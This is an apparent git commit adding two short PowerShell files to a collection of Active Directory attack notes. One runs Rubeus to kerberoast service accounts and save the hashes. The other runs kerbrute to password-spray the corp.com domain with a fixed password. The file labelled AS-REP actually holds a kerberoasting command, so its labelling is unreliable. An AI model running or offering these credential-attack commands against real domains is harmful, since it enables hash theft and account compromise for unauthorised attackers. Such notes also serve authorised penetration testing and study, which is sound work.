f13aceb18a0d4698645a4915ef0f917290690a0c
German Sanmillan <sanmillan.german@gmail.com>
2023-07-17 13:52:43 +0200

    fix

---
+++ ActiveDirectory/AttackAD/AS-REP/AS-REP.ps1
@@ -0,0 +1,5 @@
+#If we have an authenticated user in a Windows host we can try to use the Rubeus.exe:
+
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+
+
---
+++ ActiveDirectory/AttackAD/BruteForceAD/KerbruteBruteForce.ps1
@@ -0,0 +1,1 @@
+.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!" #<--- This can also be achieved with kinit but this tool is exclusive of Linux.
